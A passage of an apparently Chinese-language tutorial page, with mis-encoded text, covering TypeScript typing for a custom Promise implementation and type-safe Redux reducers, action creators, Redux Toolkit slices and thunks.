class="hljs-attr">onRejected</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">reason</span>: E</span>) =&gt;</span> U<br>  ): <span class="hljs-title class_">MyPromise</span>&lt;T | <span class="hljs-title class_">UnwrapPromise</span>&lt;U&gt;, E&gt;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>createPromise&lt;<span class="hljs-built_in">number</span>, <span class="hljs-title class_">RangeError</span>&gt;(...)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-property">message</span>)  <span class="hljs-comment">// e: RangeError â†’ string</span><br></code></pre></td></tr></table></figure><p>æŠ€å·§3ï¼šé™æ€æ–¹æ³•ç±»å‹åŒ–</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPromise</span> &#123;<br>  <span class="hljs-keyword">static</span> resolve&lt;T&gt;(<span class="hljs-attr">value</span>: T): <span class="hljs-title class_">MyPromise</span>&lt;<span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt;&gt;;<br>  <span class="hljs-keyword">static</span> all&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">values</span>: [...T]): <span class="hljs-title class_">MyPromise</span>&lt;&#123;<br>    [K <span class="hljs-keyword">in</span> keyof T]: <span class="hljs-title class_">UnwrapPromise</span>&lt;T[K]&gt;<br>  &#125;&gt;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¾¹ç•Œæƒ…å†µå¤„ç†</strong></p><p>åœºæ™¯1ï¼šç©º then å¤„ç†</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyPromise</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">then</span>(): <span class="hljs-title class_">MyPromise</span>&lt;T&gt;;  <span class="hljs-comment">// é€ä¼ å½“å‰ç±»å‹</span><br>  then&lt;U&gt;(<span class="hljs-attr">onFulfilled</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">onRejected</span>?: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">reason</span>: <span class="hljs-built_in">any</span></span>) =&gt;</span> U): <span class="hljs-title class_">MyPromise</span>&lt;T | U&gt;;<br>&#125;<br><br><span class="hljs-comment">// ç¤ºä¾‹</span><br><span class="hljs-title function_">createPromise</span>(<span class="hljs-number">42</span>)<br>  .<span class="hljs-title function_">then</span>()                <span class="hljs-comment">// ç±»å‹ä»ä¸º MyPromise&lt;number&gt;</span><br>  .<span class="hljs-title function_">then</span>(<span class="hljs-literal">null</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;&#125;);  <span class="hljs-comment">// è·³è¿‡æˆåŠŸå›è°ƒ</span><br></code></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šæ··åˆåŒæ­¥&#x2F;å¼‚æ­¥è¿”å›å€¼</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">AsyncValue</span>&lt;T&gt; = T | <span class="hljs-title class_">PromiseLike</span>&lt;T&gt;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapAsync</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PromiseLike</span>&lt;infer U&gt; ? U : T;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyPromise</span>&lt;T&gt; &#123;<br>  then&lt;U&gt;(<br>    <span class="hljs-attr">onFulfilled</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: T</span>) =&gt;</span> <span class="hljs-title class_">AsyncValue</span>&lt;U&gt;<br>  ): <span class="hljs-title class_">MyPromise</span>&lt;<span class="hljs-title class_">UnwrapAsync</span>&lt;U&gt;&gt;;<br>&#125;<br><br><span class="hljs-comment">// å¤„ç†åŒæ­¥è¿”å›å€¼</span><br><span class="hljs-title function_">createPromise</span>(<span class="hljs-number">42</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v * <span class="hljs-number">2</span>)      <span class="hljs-comment">// åŒæ­¥è¿”å› number â†’ MyPromise&lt;number&gt;</span><br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title class_">String</span>(v))); <span class="hljs-comment">// å¼‚æ­¥è¿”å› â†’ MyPromise&lt;string&gt;</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µä¸é¢è¯•è€ƒç‚¹</strong></p><p>Promise ç»„åˆæ¨¡å¼ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 1. race ç±»å‹å®ç°</span><br><span class="hljs-keyword">static</span> race&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">values</span>: T): <span class="hljs-title class_">MyPromise</span>&lt;<span class="hljs-title class_">UnwrapPromise</span>&lt;T[<span class="hljs-built_in">number</span>]&gt;&gt;;<br><br><span class="hljs-comment">// 2. é¡ºåºæ‰§è¡Œé“¾</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">tasks</span>: (<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;)[] = [...];<br>tasks.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">chain, task</span>) =&gt;</span> <br>  chain.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">task</span>()), <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()<br>);<br></code></pre></td></tr></table></figure><p>æ€§èƒ½ä¼˜åŒ–ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é¿å…æ·±å±‚é€’å½’ç±»å‹ (è®¾ç½®æœ€å¤§è§£åŒ…æ·±åº¦)</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromiseDeep</span>&lt;T, <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">number</span> = <span class="hljs-number">5</span>&gt; = <br>  <span class="hljs-title class_">Depth</span> <span class="hljs-keyword">extends</span> <span class="hljs-number">0</span> ? T :<br>  T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; <br>    ? <span class="hljs-title class_">UnwrapPromiseDeep</span>&lt;U, <span class="hljs-title class_">Subtract</span>&lt;<span class="hljs-title class_">Depth</span>, <span class="hljs-number">1</span>&gt;&gt; <br>    : T;<br></code></pre></td></tr></table></figure><p>ç»ˆææŒ‘æˆ˜ï¼šå®ç° async&#x2F;await ç±»å‹æ¨å¯¼</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ¨¡æ‹Ÿ async å‡½æ•°è¿”å›ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">AsyncFunction</span>&lt;T&gt; = <span class="hljs-function">(<span class="hljs-params">...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-title class_">MyPromise</span>&lt;T&gt;;<br><br><span class="hljs-comment">// æ¨¡æ‹Ÿ await ç±»å‹æ¨å¯¼</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Awaited</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyPromise</span>&lt;infer U&gt; ? <span class="hljs-title class_">Awaited</span>&lt;U&gt; : T;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> runAsync&lt;F <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AsyncFunction</span>&lt;<span class="hljs-built_in">any</span>&gt;&gt;(<span class="hljs-attr">fn</span>: F): <br>  <span class="hljs-title class_">ReturnType</span>&lt;F&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MyPromise</span>&lt;infer R&gt; ? R : <span class="hljs-built_in">never</span>;<br></code></pre></td></tr></table></figure><p>é¢è¯•é—®é¢˜ç¤ºä¾‹ï¼š</p><p>Qï¼šä¸ºä»€ä¹ˆ <code>Promise&lt;Promise&lt;number&gt;&gt;</code> ä¼šè‡ªåŠ¨æ‰å¹³åŒ–ä¸º <code>Promise&lt;number&gt;</code>ï¼Ÿ</p><p>Aï¼šç”± then æ–¹æ³•çš„ç±»å‹å®šä¹‰å†³å®šï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Promise</span>&lt;T&gt; &#123;<br>  then&lt;<span class="hljs-title class_">TResult</span>&gt;(<br>    <span class="hljs-attr">onfulfilled</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">value</span>: T</span>) =&gt;</span> <span class="hljs-title class_">TResult</span> | <span class="hljs-title class_">PromiseLike</span>&lt;<span class="hljs-title class_">TResult</span>&gt;<br>  ): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">TResult</span>&gt;;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“ T æœ¬èº«æ˜¯ <code>Promise&lt;U&gt;</code> æ—¶ï¼Œvalue: T å®é™…æ¥æ”¶ <code>Promise&lt;U&gt;</code>ï¼Œä½†è¿”å› <code>TResult | PromiseLike&lt;TResult&gt;</code> ä¼šè¢«å†æ¬¡åŒ…è£…ä¸º <code>Promise&lt;TResult&gt;</code>ï¼Œå½¢æˆé€’å½’è§£åŒ…æ•ˆæœã€‚</p><h3 id="2-2-3-Redux-reducer-ç±»å‹å®‰å…¨å®ç°"><a href="#2-2-3-Redux-reducer-ç±»å‹å®‰å…¨å®ç°" class="headerlink" title="2.2.3 Redux reducer ç±»å‹å®‰å…¨å®ç°"></a>2.2.3 Redux reducer ç±»å‹å®‰å…¨å®ç°</h3><p><strong>æ ¸å¿ƒç±»å‹æ¶æ„</strong></p><p>Redux ç±»å‹å››è¦ç´ ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 1. çŠ¶æ€ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">State</span> = &#123;<br>  <span class="hljs-attr">counter</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">todos</span>: &#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span> &#125;[];<br>&#125;;<br><br><span class="hljs-comment">// 2. Action ç±»å‹ï¼ˆè”åˆç±»å‹ï¼‰</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Action</span> = <br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;INCREMENT&#x27;</span>; <span class="hljs-attr">payload</span>: <span class="hljs-built_in">number</span> &#125;<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>; <span class="hljs-attr">payload</span>: <span class="hljs-built_in">string</span> &#125;<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;TOGGLE_TODO&#x27;</span>; <span class="hljs-attr">payload</span>: <span class="hljs-built_in">string</span> &#125;;<br><br><span class="hljs-comment">// 3. Reducer å‡½æ•°ç­¾å</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Reducer</span>&lt;S&gt; = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">state</span>: S, <span class="hljs-attr">action</span>: <span class="hljs-title class_">Action</span></span>) =&gt;</span> S;<br><br><span class="hljs-comment">// 4. Dispatch ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Dispatch</span> = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">action</span>: <span class="hljs-title class_">Action</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;<br></code></pre></td></tr></table></figure><p><strong>ç±»å‹å®‰å…¨ reducer å®ç°</strong></p><p>åŸºç¡€å®ç°ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">reducer</span>: <span class="hljs-title class_">Reducer</span>&lt;<span class="hljs-title class_">State</span>&gt; = <span class="hljs-function">(<span class="hljs-params">state, action</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;INCREMENT&#x27;</span>:<br>      <span class="hljs-comment">// âœ… è‡ªåŠ¨æ¨æ–­ payload ä¸º number</span><br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">counter</span>: state.<span class="hljs-property">counter</span> + action.<span class="hljs-property">payload</span> &#125;;<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>:<br>      <span class="hljs-comment">// âœ… è‡ªåŠ¨æ¨æ–­ payload ä¸º string</span><br>      <span class="hljs-keyword">const</span> newTodo = &#123; <br>        <span class="hljs-attr">id</span>: <span class="hljs-title function_">nanoid</span>(), <br>        <span class="hljs-attr">text</span>: action.<span class="hljs-property">payload</span>, <br>        <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> <br>      &#125;;<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">todos</span>: [...state.<span class="hljs-property">todos</span>, newTodo] &#125;;<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;TOGGLE_TODO&#x27;</span>:<br>      <span class="hljs-comment">// âœ… è‡ªåŠ¨æ¨æ–­ payload ä¸º string</span><br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> <br>          todo.<span class="hljs-property">id</span> === action.<span class="hljs-property">payload</span> <br>            ? &#123; ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> &#125; <br>            : todo<br>        )<br>      &#125;;<br>    <br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// âŒ æ•è·æœªå¤„ç† action</span><br>      <span class="hljs-keyword">const</span> <span class="hljs-attr">_exhaustiveCheck</span>: <span class="hljs-built_in">never</span> = action;<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§æ¨¡å¼ï¼šç±»å‹ç”Ÿæˆå™¨</strong></p><p>è‡ªåŠ¨åˆ›å»ºç±»å‹å®‰å…¨ actionï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// Action åˆ›å»ºå‡½æ•°å·¥å‚</span><br><span class="hljs-keyword">function</span> createAction&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>, P&gt;(<span class="hljs-attr">type</span>: T) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">payload</span>: P</span>) =&gt;</span> (&#123; <span class="hljs-keyword">type</span>, payload &#125;);<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> increment = <span class="hljs-title function_">createAction</span>(<span class="hljs-string">&#x27;INCREMENT&#x27;</span>, <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span></span>) =&gt;</span> amount);<br><span class="hljs-keyword">const</span> addTodo = <span class="hljs-title function_">createAction</span>(<span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> text);<br><br><span class="hljs-comment">// è‡ªåŠ¨ç”Ÿæˆ Action ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Actions</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> increment&gt; | <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> addTodo&gt;;<br></code></pre></td></tr></table></figure><p>ç±»å‹å®‰å…¨ reducer ç”Ÿæˆå™¨ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ActionMap</span> = &#123;<br>  <span class="hljs-attr">INCREMENT</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">ADD_TODO</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">TOGGLE_TODO</span>: <span class="hljs-built_in">string</span>;<br>&#125;;<br><br><span class="hljs-keyword">function</span> createReducer&lt;S, A <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;&gt;(<br>  <span class="hljs-attr">initialState</span>: S,<br>  <span class="hljs-attr">handlers</span>: &#123;<br>    [K <span class="hljs-keyword">in</span> keyof A]: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">state</span>: S, <span class="hljs-attr">payload</span>: A[K]</span>) =&gt;</span> S<br>  &#125;<br>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">state</span>: S = initialState, <span class="hljs-attr">action</span>: &#123; </span></span><br><span class="hljs-params"><span class="hljs-function">    [K <span class="hljs-keyword">in</span> keyof A]: &#123; <span class="hljs-keyword">type</span>: K; payload: A[K] &#125; </span></span><br><span class="hljs-params"><span class="hljs-function">  &#125;[keyof A]</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (handlers[action.<span class="hljs-property">type</span>]) &#123;<br>      <span class="hljs-keyword">return</span> handlers[action.<span class="hljs-property">type</span>](state, action.<span class="hljs-property">payload</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> state;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> reducer = createReducer&lt;<span class="hljs-title class_">State</span>, <span class="hljs-title class_">ActionMap</span>&gt;(initialState, &#123;<br>  <span class="hljs-attr">INCREMENT</span>: <span class="hljs-function">(<span class="hljs-params">state, payload</span>) =&gt;</span> (&#123; ...state, <span class="hljs-attr">counter</span>: state.<span class="hljs-property">counter</span> + payload &#125;),<br>  <span class="hljs-attr">ADD_TODO</span>: <span class="hljs-function">(<span class="hljs-params">state, text</span>) =&gt;</span> (&#123; ...state, <span class="hljs-attr">todos</span>: [...state.<span class="hljs-property">todos</span>, &#123; <span class="hljs-attr">id</span>: <span class="hljs-title function_">nanoid</span>(), text &#125;] &#125;)<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Redux Toolkit é›†æˆ</strong></p><p>ç°ä»£ Redux ç±»å‹å®‰å…¨å®è·µï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; createSlice, <span class="hljs-title class_">PayloadAction</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@reduxjs/toolkit&#x27;</span>;<br><br><span class="hljs-keyword">const</span> todosSlice = <span class="hljs-title function_">createSlice</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;todos&#x27;</span>,<br>  <span class="hljs-attr">initialState</span>: [] <span class="hljs-keyword">as</span> <span class="hljs-title class_">Todo</span>[],<br>  <span class="hljs-attr">reducers</span>: &#123;<br>    <span class="hljs-attr">addTodo</span>: &#123;<br>      <span class="hljs-attr">reducer</span>: <span class="hljs-function">(<span class="hljs-params">state, <span class="hljs-attr">action</span>: <span class="hljs-title class_">PayloadAction</span>&lt;<span class="hljs-title class_">Todo</span>&gt;</span>) =&gt;</span> &#123;<br>        state.<span class="hljs-title function_">push</span>(action.<span class="hljs-property">payload</span>);<br>      &#125;,<br>      <span class="hljs-attr">prepare</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> (&#123;<br>        <span class="hljs-attr">payload</span>: &#123; <span class="hljs-attr">id</span>: <span class="hljs-title function_">nanoid</span>(), text, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> &#125;<br>      &#125;)<br>    &#125;,<br>    <span class="hljs-attr">toggleTodo</span>: <span class="hljs-function">(<span class="hljs-params">state, <span class="hljs-attr">action</span>: <span class="hljs-title class_">PayloadAction</span>&lt;<span class="hljs-built_in">string</span>&gt;</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> todo = state.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">id</span> === action.<span class="hljs-property">payload</span>);<br>      <span class="hljs-keyword">if</span> (todo) todo.<span class="hljs-property">completed</span> = !todo.<span class="hljs-property">completed</span>;<br>    &#125;<br>  &#125;<br>&#125;);<br><br><span class="hljs-comment">// è‡ªåŠ¨ç”Ÿæˆ Action ç±»å‹</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">TodosAction</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> todosSlice.<span class="hljs-property">actions</span>.<span class="hljs-property">addTodo</span>&gt; <br>  | <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> todosSlice.<span class="hljs-property">actions</span>.<span class="hljs-property">toggleTodo</span>&gt;;<br></code></pre></td></tr></table></figure><p><strong>å¤æ‚åœºæ™¯å¤„ç†</strong></p><p>å¼‚æ­¥ Action ç±»å‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">ThunkAction</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux-thunk&#x27;</span>;<br><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">AppThunk</span>&lt;<span class="hljs-title class_">ReturnType</span> = <span class="hljs-built_in">void</span>&gt; = <span class="hljs-title class_">ThunkAction</span>&lt;<br>  <span class="hljs-title class_">ReturnType</span>,<br>  <span class="hljs-title class_">State</span>,<br>  <span class="hljs-built_in">unknown</span>,<br>  <span class="hljs-title class_">Action</span><br>&gt;;<br><br><span class="hljs-keyword">const</span> fetchTodos = (): <span class="hljs-function"><span class="hljs-params">AppThunk</span> =&gt;</span> <span class="hljs-keyword">async</span> dispatch =&gt; &#123;<br>  <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_TODOS_REQUEST&#x27;</span> &#125;);<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> todos = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getTodos</span>();<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_TODOS_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: todos &#125;);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_TODOS_FAILURE&#x27;</span>, <span class="hljs-attr">payload</span>: error.<span class="hljs-property">message</span> &#125;);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Reducer ç»„åˆç±»å‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">CombinedState</span> = &#123;<br>  <span class="hljs-attr">todos</span>: <span class="hljs-title class_">TodoState</span>;<br>  <span class="hljs-attr">user</span>: <span class="hljs-title class_">UserState</span>;<br>&#125;;<br><br><span class="hljs-comment">// ç±»å‹å®‰å…¨çš„ combineReducers</span><br><span class="hljs-keyword">function</span> combineTypedReducers&lt;M&gt;(<span class="hljs-attr">reducers</span>: M): <span class="hljs-title class_">Reducer</span>&lt;&#123;<br>  [K <span class="hljs-keyword">in</span> keyof M]: M[K] <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Reducer</span>&lt;infer S&gt; ? S : <span class="hljs-built_in">never</span><br>&#125;&gt; &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">(<span 